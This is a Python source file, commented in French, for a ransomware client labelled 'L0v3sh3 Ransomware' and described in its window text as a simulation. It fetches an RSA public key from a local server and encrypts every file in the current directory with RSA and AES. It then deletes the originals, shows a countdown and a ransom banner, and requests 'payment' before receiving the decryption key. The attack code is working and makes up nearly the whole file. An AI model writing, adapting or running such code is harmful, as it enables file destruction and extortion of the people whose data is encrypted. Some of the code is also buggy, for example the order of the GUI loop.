import os
import socket , pyfiglet
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
import tkinter as tk

def encrypt(dataFile, publicKey):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''
    #Permet de lire le fichier a chiffrer
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    with open (publicKey, 'rb') as f :
        publicK= f.read()
    
    data = bytes(data)
    key = RSA.import_key(publicK)

    #permet de générer une clé symétrique de chiffrement
    sessionKey = os.urandom(16)
    cipher = PKCS1_OAEP.new(key)

    #chiffrement de la clé symétrique de chiffrement avec la clé publique
    encryptedSessionKey = cipher.encrypt(sessionKey)
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # cette partie permet d􀍛enregistrer votre fichier sous le nom de nomFichier_encrypt.ext
    [ fileName, fileExtension ] = dataFile.split('.')
    encryptedFile = fileName + '_encrypted.' + fileExtension
    
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]

    #une fois terminer de chiffré le fichier sous un autre , on supprime l'ancien fichier
    os.remove(dataFile)
    print('Encrypted file saved to ' + encryptedFile)


def decrypt(dataFile, privateKeyFile):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''
    # Permet de lire la clé privée
    with open(privateKeyFile, 'rb') as f:
        privateKey = f.read()
        # create private key object
        key = RSA.import_key(privateKey)
        

    with open(dataFile, 'rb') as f:
        # read the session key
        encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]

    cipher = PKCS1_OAEP.new(key)
    # Permet de déchiffrer la clé de chiffrement
    sessionKey = cipher.decrypt(encryptedSessionKey)
    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)


    #Pour dechiffrer les données
    data = cipher.decrypt_and_verify(ciphertext, tag)
    [ fileName, fileExtension ] = dataFile.split('.')
    decryptedFile = fileName + '_decrypted.' + fileExtension

    with open(decryptedFile, 'wb') as f:
        f.write(data)
        print('Decrypted file saved to ' + decryptedFile)
    
    #une fois décrypter le fichier , on supprime le fichier crypté 
    os.remove(dataFile)


def countdown(count):
# change text in label
# count = '01:30:00'
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)
    label['text'] = '{}:{}:{}'.format(hour, minute, second)
    if second > 0 or minute > 0 or hour > 0:
    # call countdown again after 1000ms (1s)
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
    
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
root = tk.Tk()
root.title('L0v3sh3 Ransomware')
root.geometry('500x300')
root.resizable(False, False)
label1 = tk.Label(root, text='Your data is under rest, please don\'t pay me,\nthis just simulation !!\n\n', font=('calibri', 12,'bold'))
label1.pack()
label = tk.Label(root,font=('calibri', 50,'bold'), fg='white', bg='blue')
label.pack()
# call countdown first time
countdown('00:00:10')
# root.after(0, countdown, 5)
root.mainloop()
    

def client():
    host = socket.gethostname()
    port = 3000


    client_socket = socket.socket()
    client_socket.connect((host, port))

    #recevoir la clé public pour chiffré
    publick = client_socket.recv(2048).decode()
    publick = bytes(publick,encoding='utf8')
    with open("public.pem","wb") as f :
        f.write(publick)

    #mainteneant on va mettre en place les fichiers à chiffré
    #nous allons aller plus loin, on va juste chiffré les fichiers présent dans le repertoire courant mais c'est possible d'aller plus loin

    file_encrypt = []

    for file in os.listdir() :
        #nous n'allons pas chiffré notre propre fichiers comme meme 
        if file == "serveur.py" or file == "client.py" or file == "README.txt" or file=="public.pem" or file=="private.pem":
              continue
        else :
            file_encrypt.append(file)

    #On chiffre les fichiers avec la clé publique
    for file in file_encrypt :
        encrypt(file, 'public.pem')
    
    #countdown('02:00:00')
    
    banner  = pyfiglet.figlet_format("RASOMWARE DOMMAGE !!!")
    print(banner)

    #countdown('01:30:00')
    payement = input("Entre payer pour déchiffrer :")

    client_socket.send(payement.encode())

    privatek = client_socket.recv(2048).decode()
    privatek =bytearray(privatek,encoding='utf8')
    with open('private.pem','wb') as f :
        f.write(privatek)
    
    file_dencrypt = []

    for file in os.listdir() :
        #nous n'allons pas chiffré notre propre fichiers comme meme 
        if file == "serveur.py" or file == "client.py" or file == "README.txt" or file=="public.pem" or file=="private.pem":
              continue
        else :
            file_dencrypt.append(file)
    for file in file_dencrypt :
        decrypt(file, 'private.pem')
    

    client_socket.close()

client()
     


